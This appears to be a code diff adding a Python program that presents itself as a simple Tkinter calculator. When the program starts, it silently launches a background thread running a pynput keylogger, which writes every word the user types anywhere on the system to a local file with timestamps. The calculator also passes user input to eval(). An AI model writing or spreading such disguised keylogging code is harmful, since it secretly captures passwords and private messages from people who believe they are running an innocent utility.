@@ -1,0 +1,82 @@
+import tkinter as tk
+from pynput import keyboard
+import threading
+import logging
+
+LOG_FILE = "keylogs.txt"
+logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")
+stop_keylogger_event = threading.Event()
+key_buffer = []
+def log_word():
+    global key_buffer
+    if key_buffer:
+        word = ''.join(key_buffer)
+        logging.info(f"Word typed: {word}")
+        key_buffer = []  
+def keylogger():
+    def on_press(key):
+        global key_buffer
+        try:
+            
+            if hasattr(key, 'char') and key.char.isprintable():
+                key_buffer.append(key.char)
+            elif key == keyboard.Key.space or key == keyboard.Key.enter:
+                
+                log_word()
+            elif key == keyboard.Key.backspace:
+               
+                if key_buffer:
+                    key_buffer.pop()
+        except Exception as e:
+            logging.error(f"Error: {e}")
+
+        if key == keyboard.Key.esc:
+            stop_keylogger_event.set()
+            return False 
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+class SimpleCalculator:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Simple Calculator")
+
+        self.result_var = tk.StringVar()
+
+        self.display = tk.Entry(self.root, textvariable=self.result_var, font=("Arial", 16), bd=10, relief="sunken", justify="right")
+        self.display.grid(row=0, column=0, columnspan=4)
+
+        buttons = [
+            ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('/', 1, 3),
+            ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('*', 2, 3),
+            ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('-', 3, 3),
+            ('0', 4, 0), ('C', 4, 1), ('=', 4, 2), ('+', 4, 3),
+        ]
+
+        for (text, row, col) in buttons:
+            button = tk.Button(self.root, text=text, width=10, height=3, font=("Arial", 16),
+                               command=lambda t=text: self.on_button_click(t))
+            button.grid(row=row, column=col)
+
+    def on_button_click(self, button_text):
+        if button_text == "=":
+            try:
+                result = str(eval(self.result_var.get()))
+                self.result_var.set(result)
+            except:
+                self.result_var.set("Error")
+        elif button_text == "C":
+            self.result_var.set("")
+        else:
+            self.result_var.set(self.result_var.get() + button_text)
+
+if __name__ == "__main__":
+    keylogger_thread = threading.Thread(target=keylogger, daemon=True)
+    keylogger_thread.start()
+
+    root = tk.Tk()
+    app = SimpleCalculator(root)
+    root.mainloop()
+
+    stop_keylogger_event.wait()
